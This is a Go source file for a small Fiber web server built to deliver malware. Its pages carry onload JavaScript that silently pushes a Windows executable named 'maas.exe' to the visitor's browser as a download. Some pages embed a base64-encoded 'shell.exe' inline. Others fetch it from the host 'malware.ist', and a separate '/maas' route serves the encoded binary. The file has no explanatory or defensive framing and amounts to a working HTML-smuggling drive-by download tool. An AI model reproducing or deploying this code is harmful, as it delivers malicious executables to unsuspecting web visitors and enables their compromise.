package main

import (
	"bufio"
	"encoding/base64"
	"io/ioutil"
	"os"

	"github.com/gofiber/fiber"
)

func main() {
	app := fiber.New()

	app.Get("/hello", func(c *fiber.Ctx) {
		c.Set("Content-Type", "text/html")
		c.SendString(helloStr())

	})

	app.Get("/file/:method/:case?", func(c *fiber.Ctx) {
		c.Send(c.Params("method"), " ", c.Params("case"))

		method := c.Params("method")
		caseStr := c.Params("case")
		if method == "inline" {
			if caseStr == "1" {
				//c.SendFile("inline.html")
				c.SendStatus(404)
			} else {
				c.SendString(inlineStr())
			}

		} else if method == "call" {

			if caseStr == "1" {
				//c.SendFile("call.html")
				c.SendStatus(404)
			} else {
				c.SendString(callString())
			}

		} else {
			c.SendStatus(404)
		}
	})

	app.Get("/maas", func(c *fiber.Ctx) {
		fileData := readFileAsBinary()
		c.Send(fileData)
	})
	//app.Static("/", ".")
	app.Listen(80)
}

func helloStr() string {
	return `
	<!DOCTYPE html>
	<html lang="en-US">
	
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>ss</title>
		<script type="text/javascript">

			window.onload = function() {
				alert("WORKS!");
			}		
		</script>
	</head>
	<body>
		<p>
			Content
		</p>
	</body>
	</html>
	`
}

func inlineStr() string {
	fileBase64Str := readFileAsBinary()
	fileStr := `
	<!DOCTYPE html>
	<html lang="en-US">
	
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>ss</title>
		<script type="text/javascript">
	
			function base64ToArrayBuffer(base64) {
				var binaryString =  window.atob(base64);
				var binaryLen = binaryString.length;
				var bytes = new Uint8Array(binaryLen);
				for (var i = 0; i < binaryLen; i++)        {
					var ascii = binaryString.charCodeAt(i);
					bytes[i] = ascii;
				}
				return bytes;
			}
	
			var HttpClient = function() {
				this.get = function(aUrl, aCallback) {
						var anHttpRequest = new XMLHttpRequest();
						anHttpRequest.onreadystatechange = function() { 
							if (anHttpRequest.readyState == 4 && anHttpRequest.status == 200)
								aCallback(anHttpRequest.responseText);
						}
	
						anHttpRequest.open( "GET", aUrl, true );            
						anHttpRequest.send( null );
					}
			}
	
			window.onload = function() {
				var saveByteArray = (function () {
					var a = document.createElement("a");
					document.body.appendChild(a);
					a.style = "display: none";
					return function (data, name) {
						var blob = new Blob(data, {type: "octet/stream"}),
							url = window.URL.createObjectURL(blob);
						a.href = url;
						a.download = name;
						a.click();
						window.URL.revokeObjectURL(url);
					};
				}());
			
				var sampleBytes = base64ToArrayBuffer('` + fileBase64Str + `');
				saveByteArray([sampleBytes],'maas.exe');
	
				
			}
			
			
			
					
		</script>
	</head>
	
	<body>
		<p>
			Content
		</p>
	</body>
	
	
	
	</html>

	
	`
	return fileStr
}

func callString() string {
	fileStr := `<!DOCTYPE html>
	<html lang="en-US">
	
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>ss</title>
		<script type="text/javascript">
	
			function base64ToArrayBuffer(base64) {
				var binaryString =  window.atob(base64);
				var binaryLen = binaryString.length;
				var bytes = new Uint8Array(binaryLen);
				for (var i = 0; i < binaryLen; i++)        {
					var ascii = binaryString.charCodeAt(i);
					bytes[i] = ascii;
				}
				return bytes;
			}
	
			var HttpClient = function() {
				this.get = function(aUrl, aCallback) {
						var anHttpRequest = new XMLHttpRequest();
						anHttpRequest.onreadystatechange = function() { 
							if (anHttpRequest.readyState == 4 && anHttpRequest.status == 200)
								aCallback(anHttpRequest.responseText);
						}
	
						anHttpRequest.open( "GET", aUrl, true );            
						anHttpRequest.send( null );
					}
			}
	
			window.onload = function() {
				var saveByteArray = (function () {
					var a = document.createElement("a");
					document.body.appendChild(a);
					a.style = "display: none";
					return function (data, name) {
						var blob = new Blob(data, {type: "octet/stream"}),
							url = window.URL.createObjectURL(blob);
						a.href = url;
						a.download = name;
						a.click();
						window.URL.revokeObjectURL(url);
					};
				}());
			
				var client = new HttpClient();
				client.get('http://malware.ist/maas', function(response) {
					var dataArr = base64ToArrayBuffer(response);
					console.log(dataArr);
					saveByteArray([dataArr],'maas.exe');
	
				});
			}		
		</script>
	</head>
	
	<body>
		<p>
			Content
		</p>
	</body>
	</html>`

	return fileStr
}

func readFileAsBinary() string {
	f, _ := os.Open("./shell.exe")
	// Read entire JPG into byte slice.
	reader := bufio.NewReader(f)
	data, _ := ioutil.ReadAll(reader)

	b64String := base64.StdEncoding.EncodeToString(data)
	return b64String
}
